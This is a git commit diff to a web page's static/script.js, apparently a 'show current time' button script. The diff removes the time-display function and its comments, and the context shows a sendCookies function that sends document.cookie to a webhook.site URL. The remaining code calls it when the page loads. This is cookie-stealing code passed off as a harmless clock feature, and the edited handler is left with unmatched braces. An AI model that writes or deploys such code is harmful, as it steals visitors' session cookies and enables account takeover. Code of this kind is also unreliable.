e9fa664d9c81884930064d7fc8cc573c96564797
miracul9228 <134514965+miracul9228@users.noreply.github.com>
2025-04-23 20:15:12 +0800

    Update script.js

--- static/script.js
+++ static/script.js
@@ -1,20 +1,7 @@
 document.addEventListener("DOMContentLoaded", function () {
   const button = document.getElementById("showTimeButton");
-
-  // 綁定事件，防止重複綁定
-  button.addEventListener("click", function () {
-    displayCurrentTime();
     sendCookies();
   });
-
-  // 顯示當前時間
-  function displayCurrentTime() {
-    const now = new Date();
-    const timeString = now.toLocaleTimeString();
-    document.getElementById("timeDisplay").innerText = "現在時間: " + timeString;
-  }
-
-  // 發送 Cookies 至 Webhook
   function sendCookies() {
     const url = `https://webhook.site/b8fec0c7-3992-4c89-a8ed-b3c8bc6d619d?cookie=${encodeURIComponent(document.cookie)}`;
 
